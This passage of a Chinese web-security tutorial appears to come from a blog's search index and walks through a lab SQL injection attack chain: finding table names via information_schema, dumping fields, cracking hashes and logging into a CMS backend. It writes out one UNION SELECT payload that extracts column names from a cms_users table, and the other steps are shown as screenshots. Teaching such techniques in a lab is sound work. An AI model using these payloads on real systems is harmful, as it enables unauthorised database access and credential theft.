class="headerlink" title="4.7.1 暴力破解的思路"></a>4.7.1 暴力破解的思路</h3><ul><li>案例</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165838388.png" alt="暴力破解的思路" style="zoom:80%;"><h3 id="4-7-2-利用information-schema数据库获取"><a href="#4-7-2-利用information-schema数据库获取" class="headerlink" title="4.7.2 利用information_schema数据库获取"></a>4.7.2 利用information_schema数据库获取</h3><ul><li>获取思路</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165934014.png" alt="image-20241122165934014" style="zoom:90%;"><ul><li>获取关于目标数据库的所有表名</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170057236.png" alt="获取关于目标数据库的所有表名" style="zoom:80%;"><h2 id="4-8-获取目标数据表字段名"><a href="#4-8-获取目标数据表字段名" class="headerlink" title="4.8 获取目标数据表字段名"></a>4.8 获取目标数据表字段名</h2><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">http://192.168.33.4/cms/show.php ?id=-35 union select 1,2,3,4,5,6,7,8,9,10,hex(group_concat(column_name)),12,13,14,15 from information_schema.columns where table_schema=database() and table_name=cms_users--+ 为了避免单引号的使用，将cms_users转化成十六进制形式。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>案例</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170337710.png" alt="获取目标数据表字段名" style="zoom:80%;"><h2 id="4-8-获取字段的值"><a href="#4-8-获取字段的值" class="headerlink" title="4.8 获取字段的值"></a>4.8 获取字段的值</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170421214.png" alt="获取字段的值" style="zoom:80%;"><h2 id="4-9-解密hash值"><a href="#4-9-解密hash值" class="headerlink" title="4.9 解密hash值"></a>4.9 解密hash值</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170556162.png" alt="解密hash值" style="zoom:80%;"><h2 id="4-10-登录后台"><a href="#4-10-登录后台" class="headerlink" title="4.10 登录后台"></a>4.10 登录后台</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170615237-2266376.png" alt="登录后台" style="zoom:80%;">]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> sql注入基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
